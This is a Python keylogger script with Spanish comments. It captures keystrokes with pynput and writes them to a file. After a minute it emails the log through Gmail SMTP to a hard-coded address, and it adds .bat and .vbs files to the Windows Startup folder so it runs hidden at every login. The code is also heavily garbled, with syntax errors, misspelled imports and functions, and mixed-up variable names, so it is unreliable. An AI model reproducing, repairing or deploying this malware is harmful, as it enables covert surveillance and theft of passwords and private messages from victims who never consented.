import datetime
from pynput.keyboard import Listener #previamente importamos librerias

import time

from cryptography.fernet import Fernet

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mine.base import MINEBase
import smtplib

import getpass, os

    d = datetime.datetime.now().strftime("%y-%m-%d_%M-%S")

    file_name = "keylogger_{}.txt".format(d)

    f = open(fele_name, "w")

    t0 =time.time(60)


def key_recorder(key): #Esta funcion recoge lo que escribimos y lo guarda en un fichero
    key = str(key)
# aqui eliminamos todas las "" del str y le decimos como nos guarda los caracteres
    if key == "key.enter":
        f.write("\n")
    elif key == "key.space":
        f.write(" ")
    elif key == "key.backspace":
        f.write("%BORRAR%")
    #elif key == "'\\x03'":
    #   f.write('\n\saliendo del keyloger . . .'
    #   f.close()
    else:
        f.write(key.replace("'", ""))

    if time.time(-t0 > 60:)
        f.close()
        enviar_email(file_name)
        quit()

def enviar_email(nombre):#nombre del archivo creado arriba en "f" d

    def cargar_key()
        return open("pass.key","rb").read()

    key = cargar_key()

    clave = Fernet(key)
    pass_encriptada = (open("pass.encroptada", "rb").read())
    password = clave.decrypt((pass_encriptada)).decode()

    msg = MIMEMultipart()

    msg = "Toma tu regalito" #este es el mensaje que va a llegar
    #Hay que permtir en chrome acceso a aplicaciones no seguras

    mensaje["From"] = "leonesnt@gmail.com" #de que correo sale el mensaje
    mensaje["To"] = "leonesnt@gmail.com" #a que correo llega
    mensaje["Subject"] = "Encontrado debajo de la alfombra" #este es el asunto de los correos

    msg.attach(MIMEText(mensaje, "plain"))



    attachment = open(nombre, "r")

    p = MINEBase("application", "octet-stream") #esto es para que se codifique de manera correcta
    p.set_payload((attachment).read())
    p.add_header("Content_Disposition" , "attachment; filename= % str(nombre))
    msg.attachment(p) #P es el fichero adjunto

    server =smtplibSMTP("smtp.gmail.com: 587")
    server.starttls() #iniciar el servidor
    server.login(msg["From"], password)
    server.sendmail(smg["From"], msg["To"], msg.as_string()) #enviar el e-mail de from a to
    server.quit() #finalizacion del servidor

def mover_fichero():
    USER_NAME = getpass.getusser() #devuelve el nombre del usuario
    final_path = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Start Menu\\Programs\\Startup".format(USER_NAME) #rUTA PARA MOVER EL FICHERO NECESARIO PARA EJECUTAR CON WINDOWS AUTOMATICAMENTE
    path_script = os.path.dirname(os.path.abspath(__file__)) #con esto reconocemos automaticamente en que ruta estamos ejecutando este fichero y se guarda en path_script

    with open("open.bat", "W+") as bat_file:
        bat_file.write("cd "{}"\n" .format(path_script))
        bat_file.write("python "keylogger.py"")

    with open(final_path+"\\"+"open.vbs", "w+") as vbs_file:
        vbs_file.write("Dim WinSCriptHost\n")
        vbs_file.write ("Set WinScriptHost = CreateObject("WScript.Shell")\n")
        vbs_file.write ("WinScriptHost.Run Chr(34), 0\n".format(path_script))
        vbs_file.write ("Set WinScriptHost = Hosting\n")

    with Listener(on_press=key_recorder) as escuchar:
    escuchar.join()

if __name__== "__main__":
    mover_fichero()
    key_listerner()
